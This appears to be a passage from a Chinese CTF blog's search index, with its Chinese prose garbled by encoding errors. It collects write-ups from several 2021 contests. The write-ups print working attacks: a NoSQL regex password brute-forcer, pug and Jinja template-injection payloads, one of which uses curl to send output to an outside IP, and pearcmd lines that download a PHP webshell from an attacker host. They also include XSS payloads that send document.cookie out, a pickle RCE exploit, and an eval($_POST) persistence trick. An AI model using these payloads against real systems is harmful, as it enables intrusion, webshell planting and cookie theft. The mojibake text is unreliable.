¸å¿ƒçš„è€ƒç‚¹æ˜¯urldecodeå’Œurlencodeçš„äº¤é”™ä½¿ç”¨ï¼Œ1.æ‰€æœ‰ä»¥/adminæ‰“å¤´çš„è¯·æ±‚åªè¦ä¸æ˜¯localhostå‘èµ·çš„è¯·æ±‚ï¼Œå°±ä¼šè¢«dumpæ‰ï¼Œä½†æ˜¯å¾ˆå·§çš„æ˜¯ï¼Œåé¢æœ‰ä¸€ä¸ªåŒ¹é…æ˜¯åŒ¹é…æœ€å/è¿›è¡Œurlå»è®¿é—®æ‰€ä»¥å°±æœ‰äº†/aa/admin2.ä¸ºä»€ä¹ˆæ˜¯%3floginè€Œä¸æ˜¯?loginï¼Œé¦–å…ˆéœ€è¦urlä¸­æœ‰loginï¼Œä¸ç„¶çš„ä¹Ÿä¼šè¢«dumpæ‰ï¼Œä½†æ˜¯æœ‰äº†loginåˆæœ‰äº†?loginå°±ä¸ä¼šè¢«å½“åšæ˜¯urlçš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ˜¯ä¸€ä¸ªstringï¼Œå½“è¿™é‡Œurlencodeä»¥åï¼Œå°±ä¼šè¢«å½“æˆæ˜¯urlçš„ä¸€éƒ¨åˆ†äº†ï¼Œå¹¶ä¸”åé¢è¿˜æœ‰decodeè§£ç å›æ¥ï¼Œæ‰€ä»¥ä¸ä¼šå½±å“è®¿é—®3.ä¸ºä»€ä¹ˆéœ€è¦äºŒæ¬¡ç¼–ç ï¼Ÿå› ä¸ºå‡ºé¢˜äººå°±æ˜¯è¿™æ ·è®¾ç½®çš„= public function route(Request $request) { $url_decoded = urldecode( $request-&gt;url ); while ($route = $this-&gt;current()) { if ($route !== false &amp;&amp; $route-&gt;matchMethod($request-&gt;method) &amp;&amp; $route-&gt;matchUrl($url_decoded, $this-&gt;case_sensitive)) { return $route; } $this-&gt;next(); } return false;} if (preg_match('#^'.$regex.'(?:\\?.*)?$#'.(($case_sensitive) ? '' : 'i'), $url, $matches)) { foreach ($ids as $k =&gt; $v) { $this-&gt;params[$k] = (array_key_exists($k, $matches)) ? urldecode($matches[$k]) : null; } $this-&gt;regex = $regex; return true; } return false;} candyshopéšä¾¿æ³¨å†Œäº†ä¸€ä¸ªè´¦å·ç™»å½•ï¼Œå‘ç°åé¢éœ€è¦ç”¨æˆ·æ˜¯activeæ‰æœ‰è¿›ä¸€æ­¥æ“ä½œæ‰€ä»¥è¿˜æ˜¯è¦å…ˆæ³¨å‡ºè¿™ä¸ªå¯†ç ï¼Œæ ¹æ®åé¢çš„ä¸€ç³»åˆ—è·³è½¬ï¼Œå‘ç°æ˜¯ä¸€ä¸ªnosqlæ•°æ®åº“ import requestschars='0123456789abcdef'ans=''url=&quot;http://123.60.21.23:23333/user/login&quot;s=requests.session()for pos in range(1,100): for ch in chars: data={'username':'rabbit','password[$regex]':'^'+ans+ch+'.*$'} res=s.post(url=url,data=data) #print(data) #print(res.text) if 'Bad' in res.text: ans +=ch break if ch=='f': exit(0) print(pos,ans) è·‘å‡ºå¯†ç ï¼Œç»§ç»­è¿½è¸ªç™»å½•çš„è·¯ç”±: å‘ç°è¿™é‡Œæœ‰ä¸€ä¸ªpugçš„æ¨¡æ¿æ¸²æŸ“ï¼Œä¸”å†…å®¹å¯æ§,pugæ¸²æŸ“å†…å®¹è¿˜æœ‰æ ¼å¼è¦æ±‚ï¼Œè¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ç¼©è¿›ï¼Œç”±äºæœ‰ç¼©è¿›ï¼Œæ‰€ä»¥å…¶å®å‰é¢çš„å†…å®¹å¦‚æœä¸æ˜¯1ä¹‹ç±»çš„ï¼Œå¯èƒ½å°±ä¸è¡Œäº†ï¼Œä¼šå¯¼è‡´å‡ºé”™ä¹‹ç±»çš„ username=1&amp;candyname=1&amp;address='+flag=global.process.mainModule.constructor._load('child_process').execSync(&quot;cat+/flag&quot;).toString()+a=' VerySafeå•¥ä¹Ÿæ²¡æœ‰ï¼ŒæŠ“åŒ…çš„æ—¶å€™çœ‹åˆ°ä¸€ä¸ª Server: Caddy æ‰¾äº†å¾ˆä¹…çš„æ–‡ç« éƒ½æ²¡çœ‹åˆ°ç›¸å…³çš„ä»‹ç»==ï¼Œç„¶åæ‰çœ‹åˆ°æœ‰äººè¯´äº†ä¸€ä¸‹caddyçš„æŸä¸ªç›®å½•ç©¿è¶Šæ¼æ´,ç„¶åæµ‹è¯•è¿˜å‘ç°Caddyå­˜åœ¨ä¸Nginxä¸€æ ·çš„ï¼Œä½¿ç”¨cgiæ¨¡å¼æ‰§è¡Œphpæ—¶ï¼Œa.jpg/.phpå°†a.jpgå½“ä½œphpè§£æçš„é—®é¢˜ï¼Œä½†æ˜¯ä»ç„¶å—security.limit_extensionsé™åˆ¶â€”â€”ç›¸å½“äºå­˜åœ¨æ–‡ä»¶åŒ…å« /../../../../usr/local/lib/php/pearcmd.php?f=pearcmd&amp;+install+-R+/tmp/+http://110.42.133.xxx/pear.php/../../../../tmp/tmp/pear/download/pear.php","link":"/2021/09/15/Rctf/"},{"title":"ä½¿ç”¨pearå‘½ä»¤ç›´æ¥å†™é©¬","text":"register_argc_argv1.é¦–å…ˆäº†è§£åˆ°è¿™ä¸ªå‚æ•°é»˜è®¤æ˜¯ONçš„2.å½“è¿™ä¸ªå‚æ•°å¼€å¯çš„æ—¶å€™ï¼Œphpä¼šæ³¨å†Œargcå’Œargcè¿™ä¸¤ä¸ªå…¨å±€å˜é‡ã€‚ pearPear æ˜¯ PHP æ‰©å±•ä¸åº”ç”¨åº“ï¼ˆthe PHP Extension and Application Repositoryï¼‰çš„ç¼©å†™ï¼Œæ˜¯ä¸€ä¸ª PHP æ‰©å±•åŠåº”ç”¨çš„ä¸€ä¸ªä»£ç ä»“åº“ã€‚Pear ä»“åº“ä»£ç æ˜¯ä»¥åŒ…ï¼ˆpackageï¼‰åˆ†åŒºï¼Œæ¯ä¸€ä¸ª Pear package éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„é¡¹ç›®æœ‰ç€è‡ªå·±ç‹¬ç«‹çš„å¼€å‘å›¢é˜Ÿã€ç‰ˆæœ¬æ§åˆ¶ã€æ–‡æ¡£å’Œå…¶ä»–åŒ…çš„ä¾èµ–å…³ç³»ä¿¡æ¯ã€‚Pear package ä»¥ pharã€tar æˆ– zip å‘å¸ƒã€‚ å› ä¸ºpearæ˜¯åŒ…ç®¡ç†å™¨ï¼Œæ‰€ä»¥å­˜åœ¨ä¸‹è½½å’Œå®‰è£…åŒ…åŠŸèƒ½åœ¨pearå‘½ä»¤çš„æºç ä¸‹ï¼Œå¯ä»¥å‘ç°: #!/bin/sh# first find which PHP binary to useif test &quot;x$PHP_PEAR_PHP_BIN&quot; != &quot;x&quot;; then PHP=&quot;$PHP_PEAR_PHP_BIN&quot;else if test &quot;/usr/local/bin/php&quot; = '@'php_bin'@'; then PHP=php else PHP=&quot;/usr/local/bin/php&quot; fifi# then look for the right pear include dirif test &quot;x$PHP_PEAR_INSTALL_DIR&quot; != &quot;x&quot;; then INCDIR=$PHP_PEAR_INSTALL_DIR INCARG=&quot;-d include_path=$PHP_PEAR_INSTALL_DIR&quot;else if test &quot;/usr/local/lib/php&quot; = '@'php_dir'@'; then INCDIR=`dirname $0` INCARG=&quot;&quot; else INCDIR=&quot;/usr/local/lib/php&quot; INCARG=&quot;-d include_path=/usr/local/lib/php&quot; fifiexec $PHP -C -q $INCARG -d date.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=&quot;&quot; -d safe_mode=0 -d register_argc_argv=&quot;On&quot; -d auto_prepend_file=&quot;&quot; -d auto_append_file=&quot;&quot; $INCDIR/pearcmd.php &quot;$@&quot; ï¼Œå¯ä»¥çœ‹åˆ°åé¢è°ƒç”¨äº†argvçš„å€¼ï¼Œæ˜¯ä»åŒ…å«çš„å¦ä¸€ä¸ªæ–‡ä»¶ä¸­æ¥çš„ require_once 'Console/Getopt.php';/* ... */$argv = Console_Getopt::readPHPArgv(); åœ¨console/Getopt.phpæœ‰å¦‚ä¸‹å®ç°æ–¹æ³•: public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;; return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } å¯ä»¥çœ‹åˆ°è·å–$argvçš„æ–¹å¼æ˜¯global $argv --&gt; $_SERVER['argv'] --&gt; $GLOBALS['HTTP_SERVER_VARS']['argv'] åˆ©ç”¨é“¾å½“æˆ‘ä»¬åŒ…å«pearcmd.phpçš„æ—¶å€™ï¼Œç›¸å½“äºåŒ…å«äº†è¿™ä¸ªphpæ–‡ä»¶é‡Œé¢çš„æ‰€æœ‰å˜é‡ï¼Œç”±äºargvå˜é‡æˆ‘ä»¬å¯æ§ï¼Œé‚£ä¹ˆæˆ‘å°±å¯ä»¥é€šè¿‡pearå‘½ä»¤æ¥getshelläº† pearå‘½ä»¤ä»»æ„æ–‡ä»¶ä¸‹è½½é¦–å…ˆè¦cdåˆ°/usr/lib/phpç„¶åç”¨ pear dowload http://xxx.xx.xx.xx/pear.php å³å¯ä¸‹è½½åˆ°å½“å‰ç›®å½•ä¸‹å¦‚æœ/var/www/htmlç›®å½•å¯å†™: pear install -R /var/www/html http:/xxxxxx/pear.php å¦‚ä½•ä½¿ç”¨argvå’Œargcä¼ å€¼è¿›è¡Œpeargetshell é˜…è¯»åº•å±‚cä»£ç  PHPAPI void php_build_argv(const char *s, zval *track_vars_array){zval arr, argc, tmp;int count = 0;if (!(SG(request_info).argc || track_vars_array)) {return;}array_init(&amp;arr);/* Prepare argv */if (SG(request_info).argc) { /* are we in cli sapi? */int i;for (i = 0; i &lt; SG(request_info).argc; i++) {ZVAL_STRING(&amp;tmp, SG(request_info).argv[i]);if (zend_hash_next_index_insert(Z_ARRVAL(arr), &amp;tmp) == NULL) {zend_string_efree(Z_STR(tmp));}}} else if (s &amp;&amp; *s) {while (1) {const char *space = strchr(s, '+');/* auto-type */ZVAL_STRINGL(&amp;tmp, s, space ? space - s : strlen(s));count++;if (zend_hash_next_index_insert(Z_ARRVAL(arr), &amp;tmp) == NULL) {zend_string_efree(Z_STR(tmp));}if (!space) {break;} s= space + 1;}} å¯ä»¥çŸ¥é“argvé€šè¿‡query_stringå–å€¼ï¼Œå¹¶é€šè¿‡+ä½œä¸ºåˆ†éš”ç¬¦ // webç›®å½•å¯å†™- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php- http://ip:port/tmp/pear/download/evil.php// tmpç›®å½•å¯å†™- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php- http://ip:port/include.php?f=/tmp/pear/download/evil rctfçš„payload /../../../../usr/local/lib/php/pearcmd.php?f=pearcmd&amp;+install+-R+/tmp/+http://110.42.133.xxxx/pear.php/../../../../tmp/tmp/pear/download/pear.php&lt;script language='php'&gt;eval($_POST['a']);&lt;/script&gt;&lt;script language='php'&gt; eval($_POST['a']);&lt;/script&gt;","link":"/2021/09/13/%E4%BD%BF%E7%94%A8pear%E5%91%BD%E4%BB%A4%E7%9B%B4%E6%8E%A5%E5%86%99%E9%A9%AC/"},{"title":"è·¨ç«™è„šæœ¬æ”»å‡»","text":"xssæ‰“cookieå§¿åŠ¿æ€»ç»“xssæ”»å‡»æ˜¯å®¢æˆ·ç«¯æ”»å‡» xssæ˜¯ä»€ä¹ˆå°†ä»»æ„javascriptä»£ç æ’å…¥åˆ°å…¶ä»–webç”¨æˆ·é¡µé¢æ‰§è¡Œä»¥è¾¾åˆ°æ”»å‡»ç›®çš„å½“ç”¨æˆ·é‡Œæµè§ˆæ”¹é¡µæ—¶ï¼Œæ¶æ„ä»£ç å°†ä¼šè¢«æ‰§è¡Œï¼Œç”¨æˆ·çš„ä¿¡æ¯ç­‰å°†è¢«çªƒå–ã€‚ å®¹æ˜“äº§ç”Ÿxssçš„åœ°æ–¹1.æ•°æ®äº¤äº’çš„åœ°æ–¹ï¼šgetã€postã€cookiesã€headers2æ•°æ®è¾“å‡ºçš„åœ°æ–¹ï¼š ctfä¸­çš„xss&lt;script&gt;windows('http://127.0.0.1:1234?q='+btoa(document.cookie))&lt;/script&gt;&lt;script&gt;windows.location.href='http://127.0.0.1:1234?q='+btoa(document.cookie)&lt;/script&gt; &lt;script&gt;var img=document.createElement('img');img.src='http://127.0.0.1:1234/?q='+btoa(document.cookie);document.body.append(img)&lt;/script&gt; å°†ä»¥ä¸Šå†…å®¹æ’å…¥å«æœ‰xssæ¼æ´çš„é¡µé¢ä¸­ï¼Œå…¶ä»–ç”¨æˆ·è®¿é—®è¿™äº›é¡µé¢ï¼Œä½ åœ¨æœ¬åœ°ç›‘å¬1234ç«¯å£ï¼Œå³å¯è·å¾—ä»–ä»¬çš„ä¸€äº›cookieä¿¡æ¯","link":"/2021/09/18/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"},{"title":"2021é•¿åŸæ¯","text":"ez_pythonimport pickleimport base64from flask import Flask, requestfrom flask import render_template,redirect,send_from_directoryimport osimport requestsimport randomfrom flask import send_fileapp = Flask(__name__)class User(): def __init__(self,name,age): self.name = name self.age = agedef check(s): if b'R' in s: return 0 return 1@app.route(&quot;/&quot;)def index(): try: user = base64.b64decode(request.cookies.get('user')) if check(user): user = pickle.loads(user) username = user[&quot;username&quot;] else: username = &quot;bad,bad,hacker&quot; except: username = &quot;CTFer&quot; pic = '{0}.jpg'.format(random.randint(1,7)) try: pic=request.args.get('pic') with open(pic, 'rb') as f: base64_data = base64.b64encode(f.read()) p = base64_data.decode() except: pic='{0}.jpg'.format(random.randint(1,7)) with open(pic, 'rb') as f: base64_data = base64.b64encode(f.read()) p = base64_data.decode() return render_template('index.html', uname=username, pic=p )if __name__ == &quot;__main__&quot;: app.run('0.0.0.0',port=8888) å®šä½ä¸€ä¸‹å…³é”®å‡½æ•°pickle è€ƒç‚¹å°±å‘¼ä¹‹æ¬²å‡ºäº†pickleååºåˆ—åŒ–ç»•è¿‡rå­—ç¬¦ user = pickle.loads(user) æœ‰ç°æˆçš„é“¾å­å¯ä»¥ç›´æ¥æ‰“ import requestsimport pickleimport base64#e = 'ls / -a'e = 'cat /flagggggggggggggaaa's = pickle.dumps(e)# print(s)payload = b'c__main__\\nUser\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubV' + \\ e.encode()+b' &gt; /tmp/1.txt\\nb.'response = requests.get(&quot;http://eci-2zedqu5w4d2328dulcrt.cloudeci1.ichunqiu.com:8888/?pic=/tmp/1.txt&quot;,cookies=dict( user=base64.b64encode(payload).decode()))print(response.text)for l in response.content.decode().split(&quot;\\n&quot;): if &quot;base64&quot; in l: l = l.split(&quot;\\&quot;&quot;)[1].split(&quot;,&quot;)[1] print(base64.b64decode(l).decode()) java_urljavaé¡¹ç›®ä¸‹éƒ½æœ‰ä¸€ä¸ªé…ç½®æ–‡ä»¶å¯ä»¥ä¸‹è½½ /download?filename=../../../../WEB-INF/web.xml ç„¶åå°±å¯ä»¥æ‹¿åˆ°å¾ˆå¤šè·¯ç”±æ¥ä¸‹æ¥ä¸‹è½½æºç  /download?filename=../../../../WEB-INF/classes/com/test2/aaa1/testURL.class/download?filename=../../../../WEB-INF/classes/com/test2/aaa1/download.class åœ¨å®¡è®¡æºç çš„æ—¶å€™å¯ä»¥çœ‹åˆ° String pri = tartget_url.substring(0, tartget_url.indexOf(&quot;:&quot;));if (pri.matches(&quot;(?i)file|(?i)gopher|(?i)data&quot;)) { ç¬¬ä¸€ä¸ªå†’å·å‰ä¸å¯ä»¥æ˜¯ä»¥ä¸‹ä¸‰ç§åè®®ï¼Œæ‰€ä»¥è¦æ‰¾ä¸€ä¸ªæ”¾åœ¨fileåè®®å‰é¢ï¼Œå´åˆä¸ä¼šæŠ¥é”™çš„ url:file:///etc/passwdurl:file:///url:file:///flag è¿™æ ·å°±å¯ä»¥äº†","link":"/2021/09/19/2021%E9%95%BF%E5%9F%8E%E6%9D%AF/"},{"title":"å…³äºurlçš„ä¸€äº›å°trick","text":"å‰è¨€æ„Ÿè§‰æœ€è¿‘é‡åˆ°æŒºå¤šssrfçš„é¢˜ç›®ï¼Œç„¶åå°±é‡åˆ°äº†æŒºå¤šè¿™ç§urlç»•è¿‡çš„å°trickï¼Œæ‰€ä»¥æ¥å¤ä¹ ä¸€ä¸‹ 1.è®¿é—®è·¯å¾„çš„åç¼€è¢«å†™æ­»æ—¶å¯ä»¥ä½¿ç”¨?a=åç¼€ï¼Œæˆ–è€…#è¿›è¡Œç»•è¿‡eg: ä»¥jpgç»“å°¾http://xxxx?a=jpgæ­¤æ—¶è®¿é—®çš„å†…å®¹å³ä¸º?aå‰é¢çš„ä¸œè¥¿ 2. requests ipv6ã€ipv6 zone requests.get(http://[::FFFF:127.0.0.1]:23334) requests.get(http://[::FFFF:127.0.0.1%abc]:23334)host æ”¯æŒ url ç¼–ç ï¼Œç«¯å£å·æ•°å­—æ‰©å±•ä½æ•°requests.get(http://%61.baidu.com:00080).text 3.pythonçš„urllibæ”¯æŒè¯»å–ä»»æ„æ–‡ä»¶ ``python # python3 # éƒ½ç›¸å½“äºæ‰“å¼€äº† (http://a.baidu.com/) urllib.request.urlopen(http://[a.baidu.com]).read() urllib.request.urlopen(&lt;http://[a.baidu.com]&gt;).read() urllib.request.urlopen(&lt;URL:http://[a.baidu.com]&gt;).read()urllib.request.urlopen('file:///etc/passwd').read()# python2 # éƒ½ç›¸å½“äºæ‰“å¼€äº† [http://a.baidu.com](http://a.baidu.com/) urllib.urlopen(&lt;URL:http://[a.baidu.com]&gt;).read() # è¯»æ–‡ä»¶ è€ä¸œè¥¿äº† urllib.urlopen('local_file:///etc/passwd').read() urllib.urlopen('local-file:///etc/passwd').read() # ç›¸å½“äºç”¨ ftp æ‰“å¼€ urllib.urlopen('//localhost:23334') urllib.urlopen('ftp://evil:23334') # è‹¥æœåŠ¡ç«¯è¿”å› PASV æ¨¡å¼çš„æœåŠ¡å™¨ä¸ç«¯å£ï¼Œpython 2 ä¸åšéªŒè¯ç›´æ¥è¿æ¥urllib.urlopen('local_file:///etc/passwd').read()urllib.urlopen('local-file:///etc/passwd').read() 4. PHP:file_get_contents(&quot;file://localhost/etc/passwd&quot;); 5. Java:new URL('url:file:///etc/passwd') 6.ipv6ä¸‰ä¸ªå°trick x.1.ip6.name0--1.ipv6-literal.net2408-8207-1850-2a60--4c8.ipv6-literal.net","link":"/2021/09/19/%E5%85%B3%E4%BA%8Eurl%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8Ftrick/"},{"title":"ctfshowä¸­ç§‹","text":"å‰è¨€ä¸­ç§‹èŠ‚æ²¡å•¥äº‹ï¼Œçœ‹åˆ°å­¦é•¿åœ¨åšè¿™ä¸ªæ¯”èµ›çš„é¢˜ç›®ï¼Œä¹Ÿæ¥çœ‹çœ‹ï¼Œé¢˜ç›®æŒºç®€å•çš„ï¼Œå°±æ˜¯ç¬¬ä¸‰é¢˜æ²¡è§è¿‡ï¼Œå­¦ä¹ ä¸€ä¸‹ ç¬¬ä¸€é¢˜0eå¼±ç±»å‹ ç¬¬äºŒé¢˜ä¸€ä¸ªå…¸å‹çš„æ§åˆ¶å™¨ç±»å®šä¹‰å¦‚ä¸‹ï¼š namespace app\\index\\controller;class Index { public function index() { return 'index'; }} æ§åˆ¶å™¨ç±»æ–‡ä»¶çš„å®é™…ä½ç½®æ˜¯ application\\index\\controller\\Index.php å½“æ§åˆ¶å™¨çš„å®šä¹‰ä¸º: namespace app\\index\\controller;class Index { public function hello() { return 'hello,world!'; } public function data() { return ['name'=&gt;'thinkphp','status'=&gt;1]; }} é‚£ä¹ˆæƒ³è¦è®¿é—®ä¸åŒçš„è·¯ç”±å°±è¦: http://localhost/index.php/index/Index/hellohttp://localhost/index.php/index/Index/data å›æ¥çœ‹ä¸€ä¸‹æºç è¦è®¿é—®ä¸‹é¢çš„å†…å®¹çš„è·¯ç”±å°±ä¸º /index.php/index/index/backdoor è®¿é—®ä»¥åè¯´ /../../'.&quot;install.lock has not been deleted&quot;; è¿™ä¸ªæ–‡ä»¶å­˜åœ¨ï¼Œæ— æ³•è¿›è¡Œä¸‹ä¸€æ­¥ï¼Œæ‰€ä»¥é¦–å…ˆè¦å°†è¿™ä¸ªæ–‡ä»¶åˆ é™¤çœ‹äº†ä¸€ä¸‹æºç æœ‰ä¸€ä¸ªååºåˆ—åŒ–ï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªæ•°å­—ï¼ŒæŠ¥é”™å‘ç°æ˜¯tp5.0.24çš„æ¡†æ¶ï¼Œæœç´¢äº†ä¸€ä¸‹ï¼Œæœ‰ä¸€æ¡é“¾å­ï¼Œä½†æ˜¯æ˜¯ä»»æ„æ–‡ä»¶å†™å…¥çš„é“¾å­ï¼Œçœ‹äº†ä¸€ä¸‹æºç ï¼Œåœ¨å…¥å£å°±æœ‰ä¸€ä¸ªunlinkå‡½æ•°æ‰€ä»¥ &lt;?phpnamespace think\\process\\pipes;class Windows{ private $files=[]; function __construct(){ $this-&gt;files = ['/var/www/html/application/index/controller/../../install.lock']; }}echo urlencode(serialize(new Windows())); é“¾å­é•¿è¿™æ ·å°±è¡Œäº†=-= ç„¶åå°±æ˜¯postä¸€ä¸ªcmdå‚æ•°å»æ‹¿flagç”±äºæœ€åçš„flagæœ‰ä¸ªæ­£åˆ™åŒ¹é…ï¼Œæ‰€ä»¥è¦ç»•è¿‡ï¼Œä¸€èˆ¬ç»•è¿‡å…³é”®å­—ç”¨é€šé…ç¬¦å•¥çš„éƒ½è¡Œï¼Œä½†æ˜¯è¿™é‡Œå¤–é¢åŒ…è£¹äº†å•å¼•å·ï¼Œå°±éœ€è¦ä½¿ç”¨ä¸å¯æ‰“å°çš„å­—ç¬¦è¿›è¡Œç»•è¿‡äº†ï¼Œè¿™ç‚¹åˆ°æ—¶å€™ç£¨äº†å¾ˆä¹…ï¼Œè¿˜æœ‰ä¸ªæ›´æ— è¯­çš„å°±æ˜¯ï¼Œä¸çŸ¥é“ä¸ºå•¥åœ¨ç½‘é¡µé‚£è¾¹ç”¨hackbarå‘é€å‡ºå»æ²¡æœ‰flagï¼Œè€Œåœ¨burpé‡Œé¢æ‰å¯ä»¥ ç¬¬ä¸‰é¢˜&lt;?php// é¢˜ç›®è¯´æ˜ï¼š// æƒ³åŠæ³•ç»´æŒæƒé™ï¼Œç¡®å®šæ— è¯¯åæäº¤checkï¼Œé€šè¿‡checkåï¼Œæ‰ä¼šç”Ÿæˆflagï¼Œæ­¤å‰flagä¸å­˜åœ¨error_reporting(0);highlight_file(__FILE__);$a=$_GET['action'];switch($a){ case 'cmd': eval($_POST['cmd']); break; case 'check': file_get_contents(&quot;http://checker/api/check&quot;); break; default: die('params not validate');} ä¸æ˜¯å¾ˆæ‡‚é¢˜ç›®çš„æ„æ€ï¼Œçœ‹äº†wpä»¥åï¼Œæ¨æµ‹æ˜¯è®©phpå‡ºåœ¨ä¼‘çœ çŠ¶æ€ä¸ä½œååº”ï¼Œè¿™æ ·åœ¨checkçš„æ—¶å€™æƒé™å°±ç»´æŒåœ¨åŸæ¥çš„çŠ¶æ€äº† cmd=file_put_contents(&quot;/tmp/index.php&quot;,&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);system(&quot;sleep 5 %26%26 php -S 0.0.0.0:80 -t /tmp/&quot;);","link":"/2021/09/20/ctfshow%E4%B8%AD%E7%A7%8B/"},{"title":"2021xmané€‰æ‹”èµ›","text":"å‰è¨€å¤ç°Rctfçš„æ¯”èµ›ï¼Œå¤ç°åˆ°ä¸€åŠå‘ç°å…¶ä»–éƒ½æ˜¯ä¸è¿‡10è§£çš„æ•°ï¼Œå°±æ²¡åœ¨çœ‹äº†ï¼Œçœ‹äº†ä¸€ä¸‹xmançš„æ¯”èµ›è§£å‡ºæ¥çš„äººæ•°è¿˜æŒºå¤šï¼Œäºæ˜¯å°±æƒ³è¯´å»çœ‹çœ‹ ezphp&lt;?phperror_reporting(0);highlight_file(__FILE__); class XMAN{ public $class; public $para; public $check; public function __construct() { $this-&gt;class = &quot;Hel&quot;; $this-&gt;para = &quot;xctfer&quot;; echo new $this-&gt;class ($this-&gt;para); } public function __wakeup() { $this-&gt;check = new Filter; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) { echo new $this-&gt;class ($this-&gt;para); } else die('what?Really?'); } }class Hel{ var $a; public function __construct($a) { $this-&gt;a = $a; echo (&quot;Hello bro, I guess you are a lazy &quot;.$this-&gt;a); }}class Filter{ function vaild($code){ $pattern = '/[!|@|#|$|%|^|&amp;|*|=|\\'|&quot;|:|;|?]/i'; if (preg_match($pattern, $code)){ return false; } else return true; }} if(isset($_GET['xctf'])){ unserialize($_GET['xctf']);}else{ $a=new XMAN; } è‡ªå·±å†™ä¸ªdemoå¤ç°ä¸€ä¸‹çœ‹çœ‹ï¼Œååºåˆ—é¢˜ï¼Œå´åˆæ²¡ç»™å¯ä»¥å‘½ä»¤æ‰§è¡Œæˆ–è€…è¯»æ–‡ä»¶çš„å‡½æ•°ï¼Œé‚£å…«æˆå°±æ˜¯è€ƒå¯Ÿå†…ç½®ç±»äº†ï¼Œå®šä½äº†ä¸€ä¸‹ï¼Œä¼¼ä¹ä¹Ÿå°±æ˜¯è¿™é‡Œäº† å…ˆæ„é€ ä¸€ä¸‹é“¾æ¡ï¼Œçœ‹çœ‹å¦‚ä½•åˆ°è¿™é‡Œï¼Œå†å»å¯»æ‰¾å†…ç½®ç±»ï¼š &lt;?phpclass XMAN{ public $class; public $para; public $check; public function __construct() { } public function __wakeup() { $this-&gt;check = new Filter; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) { echo new $this-&gt;class ($this-&gt;para); } else die('what?Really?'); }}class Hel{}class Filter{ function vaild($code){ $pattern = '/[!|@|#|$|%|^|&amp;|*|=|\\'|&quot;|:|;|?]/i'; if (preg_match($pattern, $code)){ return false; } else return true; }}$a=new XMAN();$b='SplFileObject';$c='flag.txt';$a-&gt;class=$b;$a-&gt;para=$c;echo serialize($a); æ ¹æœ¬å°±ä¸ç”¨å’‹æ„é€ å“ˆå“ˆå“ˆå“ˆ=-=ï¼Œå¶å°”åšåšç®€å•é¢˜ï¼Œå¢å¼ºä¸€ä¸‹è‡ªä¿¡å¿ƒ ä½ çš„åå­—å¬è¯´è¿™é¢˜æ˜¯åŸé¢˜ï¼Œå‘ç°è‡ªå·±buuè¿™é¢˜ä¹Ÿè¿˜æ²¡åšï¼Œåšä¸€ä¸‹ï¼š è¿™ä¸æ˜¯ä¸€çœ‹å°±å¤§æ¦‚ç‡æ˜¯æ¨¡æ¿æ³¨å…¥äº†ï¼Ÿæµ‹è¯•ä¸€ä¸‹çœ‹çœ‹æ˜¯ä»€ä¹ˆæ¨¡æ¿çœ‹èµ·æ¥æ˜¯è¿‡æ»¤äº†ä¸¤ä¸ªä¸­æ‹¬å·ï¼Œä¸€ä¸ªä¸­æ‹¬å·æ˜¯æ²¡äº‹çš„ï¼Œæ‰€ä»¥payloadç›´æ¥æ‰“è¿™é‡Œçš„è¿‡æ»¤è§„åˆ™æ˜¯è¿™æ ·çš„ï¼Œæ‰«æåˆ—è¡¨å¹¶å°†å…¶æ›¿æ¢ä¸ºç©ºï¼Œç„¶åconfigæ”¾åœ¨æœ€åä¸€ä¸ªï¼Œé‚£æ‰«åˆ°æœ€åä¸€ä¸ªçš„æ—¶å€™ï¼Œå°†å…¶æ›¿æ¢ä¸ºç©ºï¼Œé‚£ä¹ˆè¯­å¥å°±ä¼šä»¥æ­£ç¡®çš„å½¢å¼æ˜¾ç¤ºäº†ï¼Œå¤šæ”¶è—å‡ ä¸ªpayload: {% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclasconfigses__()[59].__init__.func_glconfigobals.linecconfigache.oconfigs.popconfigen('curl http://110.42.133.120:9999/ -d `ls / | grep flag`;') %}1{% endiconfigf %} {%set a='__bui'+'ltins__'%}{%set b='__im'+'port__'%}{%set c='o'+'s'%}{%set d='po'+'pen'%}{%print(lipsum['__globals__'][a][b](c)[d]('ls /')['read']())%}","link":"/2021/09/22/2021xman%E9%80%89%E6%8B%94%E8%B5%9B/"},{"title":"shiroæƒé™éªŒè¯ç»•è¿‡","text":"SHIROä»‹ç»shiroæ˜¯ä¸€ä¸ªjavaå®‰å…¨æ¡†æ¶ï¼Œç”¨äºæ‰§è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç ã€å’Œä¼šè¯ç®¡ç†ç³»ç»Ÿï¼Œé€šå¸¸ï¼Œshiroä¼šå’Œspringç­‰æ¡†æ¶ä¸€èµ·æ­é…ç”¨äºwebåº”ç”¨ç³»ç»Ÿçš„å¼€å‘ æƒé™éªŒè¯æ–¹å¼shiroæ˜¯åŸºäºurlçš„æƒé™éªŒè¯ï¼Œé…ç½®çš„urlæ¨¡å¼ä½¿ç”¨anté£æ 